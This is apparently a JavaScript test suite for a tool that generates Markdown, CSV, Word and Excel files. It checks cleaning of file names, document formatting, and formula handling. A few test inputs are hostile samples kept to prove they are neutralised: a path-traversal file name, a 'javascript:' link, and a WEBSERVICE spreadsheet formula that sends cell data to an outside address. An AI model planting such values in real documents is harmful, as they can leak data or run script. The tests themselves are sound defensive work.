import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readZip } from '../app/core/zip.js'
import { extractPages } from '../app/caps/files/extract.js'
import { csvRows, fileName, makeFile, replaceOnce, sheetsIn } from '../app/caps/made/formats.js'

const dec = new TextDecoder()
const DATE = new Date(2026, 9, 3, 12, 0, 0)

/** The parts of an Office file, by path. @param {Uint8Array} bytes */
async function parts(bytes) {
  return Object.fromEntries(await Promise.all(readZip(bytes).map(async (entry) => [entry.name, dec.decode(await entry.read())])))
}

// ─── Names and kinds ─────────────────────────────────────────────────────────

test('fileName: no folders, no characters Windows refuses, at most 120 characters with the extension kept', () => {
  assert.equal(fileName('  ../reports/Q3: sales?.docx '), 'reports Q3 sales.docx')
  assert.equal(fileName('.hidden.md'), 'hidden.md')
  const long = fileName(`${'é'.repeat(200)}.xlsx`)
  assert.equal(long.length, 120)
  assert.ok(long.endsWith('é.xlsx'))
})

test('makeFile: text files as written, a CSV with the mark Excel reads as UTF-8', async () => {
  const notes = await makeFile('Notes.md', '# Notes\n\n- café')
  assert.equal(notes.mimeType, 'text/markdown')
  assert.equal(dec.decode(notes.bytes), '# Notes\n\n- café')
  const csv = await makeFile('Totals.csv', 'region,total\nNorth,2540\n')
  assert.equal(csv.mimeType, 'text/csv')
  assert.deepEqual([...csv.bytes.slice(0, 3)], [0xef, 0xbb, 0xbf])
  assert.equal((await makeFile('chart.svg', '<svg/>')).mimeType, 'image/svg+xml')
  // Any kind it doesn't know is text, for a program or another tool to take up.
  const tex = await makeFile('Formules d’Euler.tex', '\\documentclass{article}')
  assert.equal(tex.mimeType, 'text/plain')
  assert.equal(dec.decode(tex.bytes), '\\documentclass{article}')
})

test('makeFile: says what it can make when the name has no kind, or one that isn’t text', async () => {
  await assert.rejects(makeFile('Report', 'text'), /Name the file with its kind/)
  await assert.rejects(makeFile('Report.pdf', 'text'), /\.pdf file can't be made.*\.docx/)
  await assert.rejects(makeFile('Photo.JPG', 'text'), /\.jpg file can't be made: it isn't text/)
  await assert.rejects(makeFile('Report.docx', '  \n'), /no content/)
})

// ─── Word ────────────────────────────────────────────────────────────────────

const REPORT = `# Sales report

Fish & chips <b>, **bold**, *italic*, ~~gone~~, \`code\` and [our site](https://example.com).
A second line.

| Region | Total |
|---|--:|
| North | 2540 |

1. First
   1. Inner
2. Second

Then:

3. Third, numbered on

- [x] Done
- [ ] To do

> Quoted

---

## مرحبا

نص عربي`

test('docx: Markdown becomes a Word document whose text reads back the same', async () => {
  const file = await makeFile('Sales report.docx', REPORT, { date: DATE })
  assert.equal(file.mimeType, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')
  const text = (await extractPages(file.name, file.bytes) ?? []).join('\n')
  for (const line of ['# Sales report', 'Fish & chips <b>, bold, italic, gone, code and our site.\nA second line.', '| Region | Total |', '| North | 2540 |', 'First', 'Inner', '☑ Done', '☐ To do', 'Quoted', '## مرحبا', 'نص عربي']) {
    assert.ok(text.includes(line), `missing: ${line}\n${text}`)
  }
})

test('docx: styles, numbering, links, right-to-left paragraphs and the paper size', async () => {
  const { bytes } = await makeFile('Sales report.docx', REPORT, { date: DATE, paper: 'letter' })
  const files = await parts(bytes)
  assert.deepEqual(Object.keys(files).sort(), ['[Content_Types].xml', '_rels/.rels', 'word/_rels/document.xml.rels', 'word/document.xml', 'word/numbering.xml', 'word/styles.xml'])
  const doc = files['word/document.xml']
  assert.match(doc, /<w:pStyle w:val="Heading1"\/>/)
  assert.match(doc, /<w:b\/><w:bCs\/><\/w:rPr><w:t xml:space="preserve">bold/)
  assert.match(doc, /Fish &amp; chips <\/w:t><\/w:r><w:r><w:t xml:space="preserve">&lt;b&gt;/)
  assert.match(doc, /<w:hyperlink r:id="rIdLink1">/)
  assert.match(files['word/_rels/document.xml.rels'], /Id="rIdLink1"[^>]*Target="https:\/\/example.com" TargetMode="External"/)
  assert.match(doc, /<w:pPr><w:pStyle w:val="Heading2"\/><w:bidi\/><\/w:pPr><w:r><w:rPr><w:rtl\/>/)
  assert.match(doc, /<w:jc w:val="right"\/>/)
  assert.match(doc, /<w:pgSz w:w="12240" w:h="15840"\/>/)
  // Each numbered list starts at its own number, at its own level: 1., then a. under it, then 3.
  assert.match(files['word/numbering.xml'], /<w:num w:numId="2"><w:abstractNumId w:val="1"\/><w:lvlOverride w:ilvl="0"><w:startOverride w:val="1"\/>/)
  assert.match(files['word/numbering.xml'], /<w:num w:numId="3"><w:abstractNumId w:val="1"\/><w:lvlOverride w:ilvl="1"><w:startOverride w:val="1"\/>/)
  assert.match(files['word/numbering.xml'], /<w:num w:numId="4"><w:abstractNumId w:val="1"\/><w:lvlOverride w:ilvl="0"><w:startOverride w:val="3"\/>/)
  assert.match(doc, /<w:numPr><w:ilvl w:val="1"\/><w:numId w:val="3"\/><\/w:numPr>/)
})

test('docx: characters XML forbids are left out, and a link that is not a web address stays text', async () => {
  const { bytes } = await makeFile('a.docx', 'bell\u0007 [here](javascript:alert(1)) end', { date: DATE })
  const doc = (await parts(bytes))['word/document.xml']
  assert.doesNotMatch(doc, /\u0007|hyperlink|javascript/)
  assert.match(doc, /bell <\/w:t>.*here.* end/)
})

// ─── Excel ───────────────────────────────────────────────────────────────────

test('csvRows: commas, semicolons or tabs, quoted cells with separators, quotes and line breaks', () => {
  assert.deepEqual(csvRows('﻿a,b\r\n1, 2\r\n'), [['a', 'b'], ['1', '2']])
  assert.deepEqual(csvRows('Région;Total\n"Nord; Est";"2540"\n\n"He said ""hi""\nthen left";x'), [['Région', 'Total'], ['Nord; Est', '2540'], ['He said "hi"\nthen left', 'x']])
  assert.deepEqual(csvRows('a\tb\n1\t2'), [['a', 'b'], ['1', '2']])
})

test('sheetsIn: Markdown tables named by their headings, each name its own and as Excel allows; or CSV named after the file', () => {
  const sheets = sheetsIn('# By month: 2026\n\n| Month | Sales |\n|---|---|\n| Jan | 1200 |\n\n# By month: 2026\n\n| A |\n|---|\n| 1 |\n\n| B |\n|---|\n| 2 |', 'Sales')
  assert.deepEqual(sheets.map((sheet) => sheet.name), ['By month 2026', 'By month 2026 2', 'By month 2026 3'])
  assert.deepEqual(sheets[0].rows, [['Month', 'Sales'], ['Jan', '1200']])
  assert.deepEqual(sheetsIn('a,b\n1,2', 'Totals'), [{ name: 'Totals', rows: [['a', 'b'], ['1', '2']] }])
})

test('xlsx: numbers, percentages, dates and formulas that only compute; everything else is text', async () => {
  const csv = 'Item,Amount,Share,Due,Total\nRent,1200,12.5%,2026-10-03,=SUM(B2:B3)\nZip code,007,5%,2026-02-30,=WEBSERVICE("https://example.com/?"&A2)\n'
  const file = await makeFile('Budget.xlsx', csv, { date: DATE })
  assert.equal(file.mimeType, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
  const files = await parts(file.bytes)
  const sheet = files['xl/worksheets/sheet1.xml']
  assert.match(sheet, /<c r="B2"><v>1200<\/v><\/c>/)
  assert.match(sheet, /<c r="C2" s="3"><v>0.125<\/v><\/c>/)
  assert.match(sheet, /<c r="C3" s="2"><v>0.05<\/v><\/c>/)
  assert.match(sheet, /<c r="D2" s="4"><v>46298<\/v><\/c>/)
  // A total is saved with its result (B3 is text, which Excel leaves out too).
  assert.match(sheet, /<c r="E2"><f>SUM\(B2:B3\)<\/f><v>1200<\/v><\/c>/)
  // Leading zeros, impossible dates and formulas that reach out stay as they were written.
  for (const ref of ['B3', 'D3', 'E3']) assert.match(sheet, new RegExp(`<c r="${ref}" t="s"><v>\\d+</v></c>`))
  assert.match(files['xl/sharedStrings.xml'], /<t xml:space="preserve">=WEBSERVICE\(&quot;https:\/\/example.com\/\?&quot;&amp;A2\)<\/t>/)
  // The header row is bold and stays in view.
  assert.match(sheet, /<c r="A1" t="s" s="1">/)
  assert.match(sheet, /<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"\/>/)
  assert.match(files['xl/workbook.xml'], /<sheet name="Budget" sheetId="1" r:id="rId1"\/>.*<calcPr fullCalcOnLoad="1"\/>/)
  const text = (await extractPages(file.name, file.bytes) ?? []).join('\n')
  assert.match(text, /^Sheet: Budget\nItem\tAmount\tShare\tDue\tTotal\nRent\t1200\t0.125\t46298\t1200\n/)
})

test('xlsx: totals over a range come with their result, unless the range holds another formula', async () => {
  const csv = 'Item,Amount\nA,0.1\nB,0.2\nC,=B2*2\nSum,=SUM(B2:B3)\nAverage,=AVERAGE(b2:b3)\nMost,=MAX($B$2:$B$3)\nCount,=COUNT(B2:B3)\nAll,=SUM(B2:B4)\nNone,=AVERAGE(C2:C3)'
  const sheet = (await parts((await makeFile('t.xlsx', csv, { date: DATE })).bytes))['xl/worksheets/sheet1.xml']
  const saved = Object.fromEntries([...sheet.matchAll(/<c r="(B\d+)"><f>[^<]*<\/f>(?:<v>([^<]*)<\/v>)?<\/c>/g)].map((m) => [m[1], m[2] ?? null]))
  assert.deepEqual(saved, { B4: null, B5: '0.3', B6: '0.15', B7: '0.2', B8: '2', B9: null, B10: null })
  // A total of percentages shows as a percentage; a count as a number.
  const shares = (await parts((await makeFile('s.xlsx', 'Item,Share\nA,40%\nB,60%\nAll,=SUM(B2:B3)\nHow many,=COUNT(B2:B3)', { date: DATE })).bytes))['xl/worksheets/sheet1.xml']
  assert.match(shares, /<c r="B4" s="2"><f>SUM\(B2:B3\)<\/f><v>1<\/v><\/c><\/row><row r="5"><c r="A5" t="s"><v>\d+<\/v><\/c><c r="B5"><f>COUNT\(B2:B3\)<\/f><v>2<\/v>/)
})

test('xlsx: several sheets read back in order; a sheet in Arabic runs right to left', async () => {
  const file = await makeFile('ميزانية.xlsx', '## الدخل\n\n| البند | المبلغ |\n|---|---|\n| راتب | 3000 |\n\n## Costs\n\n| Item | Amount |\n|---|---|\n| Rent | 1200 |', { date: DATE })
  const files = await parts(file.bytes)
  assert.match(files['xl/worksheets/sheet1.xml'], /rightToLeft="1"/)
  assert.doesNotMatch(files['xl/worksheets/sheet2.xml'], /rightToLeft/)
  assert.deepEqual(await extractPages(file.name, file.bytes), ['Sheet: الدخل\nالبند\tالمبلغ\nراتب\t3000', 'Sheet: Costs\nItem\tAmount\nRent\t1200'])
})

// ─── Changing a file ─────────────────────────────────────────────────────────

test('replaceOnce: one passage changed as written; quoted twice or not at all, it says so', () => {
  assert.equal(replaceOnce('Total: 10 $', '10 $', '12 $ and $&', 'a.md'), 'Total: 12 $ and $&')
  assert.throws(() => replaceOnce('a b a', 'a', 'c', 'a.md'), /in a.md 2 times: quote more/)
  assert.throws(() => replaceOnce('The text', 'missing', 'c', 'a.md'), /not in a.md, which reads:\nThe text/)
  assert.throws(() => replaceOnce('The text', '', 'c', 'a.md'), /Quote the passage/)
})
